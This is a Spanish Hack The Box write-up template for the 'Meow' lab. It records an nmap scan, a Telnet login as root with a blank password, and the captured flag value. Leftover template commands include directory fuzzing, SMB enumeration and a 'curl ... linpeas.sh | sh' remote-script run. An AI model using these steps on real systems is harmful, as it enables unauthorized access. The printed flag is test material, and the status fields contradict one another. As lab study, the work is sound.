---
tags:
  - htb
  - easy
  - linux
  - Terminada
ip: 10.129.31.187
os: Linux
difficulty: Easy
status: Terminada
tiempo: 1h 0m
fecha_inicio: 2026-06-05
fecha_completada: —
puntos: 0
---
# 🖥️ [Meow] — [Linux] — [Easy]

> [!info] Resumen
> **IP:** `10.129.31.187`  |  **OS:** Linux  |  **Dificultad:** Easy
> **Estado:** En progreso  |  **Tiempo total:** 1h 0m

---

## 1. Reconocimiento

### Nmap — Puertos rápidos

```bash
nmap -sS 10.129.31.187
```

**Puertos encontrados:**

| Puerto | Servicio | Versión       | Notas |
| ------ | -------- | ------------- | ----- |
| 23     | Telnet   | Linux telnetd | —     |

### Reconocimiento Web (INNECESARIO)

```bash
gobuster dir -u http://10.10.10.XXX -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ffuf -u http://10.10.10.XXX/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

**Resultados relevantes:**

- `/admin` → Panel de administración (código 200)
- `/uploads` → Directorio de subida de archivos

### Otros servicios (NO ENCONTRADOS)

> [!note] SMB / FTP / LDAP / Otros
> Anotar aquí lo relevante de servicios adicionales encontrados.

```bash
# SMB
smbclient -L //10.10.10.XXX -N
enum4linux -a 10.10.10.XXX

# FTP
ftp 10.10.10.XXX
```

---

## 2. Foothold

> [!warning] Punto de Entrada
> Describir aquí el vector de entrada principal. ¿Qué servicio? ¿Qué vulnerabilidad?

### Vulnerabilidad Identificada

**Nombre:** Mala configuración de autenticació, servicio telnet expuesto y login con usuario root y sin contraseña.  
**CVE:** No aplica. 
**Por qué funciona:** Porque el servicio Telnet está abierto y tiene un login por defecto o muy básico y sin contraseña.

### Exploit Utilizado

```bash
telnet 10.129.31.187
user: root
password: (en blanco)
resultado: acceso root
```

> [!tip] Lo que aprendí aquí
> Al tener un servicio telnet abierto, probar login con usuario root y password en blanco.

### Shell Obtenida

- **Usuario:** `root`
- **Tipo de shell:** bash

---

## 3. Escalación a Usuario (User Flag)

### Enumeración Post-Foothold

```bash
Se realizó un ls
posteriormente se hizo un cat flag.txt, resultando en lo siguiente:
b40abdfe23665f766f9c61ecba8a4c19
```

**Hallazgos relevantes:**

- SUID encontrado: `no escaneados`
- Sudo permisos: `permiso root`
- Archivos interesantes: `directorio snap`

### Método de Escalación a User

> [!success] Vector utilizado
> Describir el método con tus palabras. ¿Por qué fue posible? ¿Qué condición lo habilitó?

```bash
No se realizó escalada de privilegios ya que no fue necesario, al momento de hacer login correcto, se ingresó con usuario root, teniendo privilegios máximos.
```

### Flag de Usuario

```
flag.txt → [CAPTURADA ✓]
```

---

## 4. Escalación a Root (Root Flag) (NO APLICA)

### Enumeración de Privesc

```bash
# Linux
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Windows
.\winPEAS.exe

# Manual rápido
find / -writable -type f 2>/dev/null | grep -v proc
ss -tulnp
cat /etc/sudoers 2>/dev/null
```

**Hallazgos relevantes:**

- `...`

### Método de Privesc a Root

> [!success] Vector utilizado
> Describir el método. ¿Por qué el sysadmin cometió ese error? ¿Cómo se hubiera prevenido?

```bash
# Comandos exactos para llegar a root
```

### Flag de Root

```
root.txt → [CAPTURADA ✓]
```

---

## 5. Lecciones Aprendidas

> [!danger] ¿Qué no sabía antes de esta máquina?
> - **Técnica de Login:** Login a servicio telnet expuesto utilizando credenciales de usuario comunes como root y password en blanco.
> - **Nmap:** Escaneo de puertos y servicios.

### ¿Dónde me bloqueé y por qué?

| Fase  | Tiempo bloqueado | Causa real                                                       |
| ----- | ---------------- | ---------------------------------------------------------------- |
| Login | 15 min.          | No vi probé root en el login, tuve que ver la sugerencia de HTB. |

### Técnicas a Profundizar

- [x] Login Telnet → Buscar en HackTricks
- [x] NMAP → Leer documentación oficial
- [x] Sin CVE  → Entender el funcionamiento interno

### Herramientas Usadas

| Herramienta | Para qué la usé en esta máquina |
| ----------- | ------------------------------- |
| nmap        | Reconocimiento de puertos       |

### Conexión con Otras Máquinas / Técnicas (COMPLETAR DESPUÉS)

- Técnica similar a: `[[HTB/NombreMáquina/NombreMáquina]]`
- Ver también: `[[Técnicas/Nombre-Técnica]]`

---

## 6. Referencias

- [HackTricks - Login Telnet Root]([https://book.hacktricks.xyz/](https://cyberlabhelp.hashnode.dev/hackthebox-meow-linux-room-full-walkthrough))

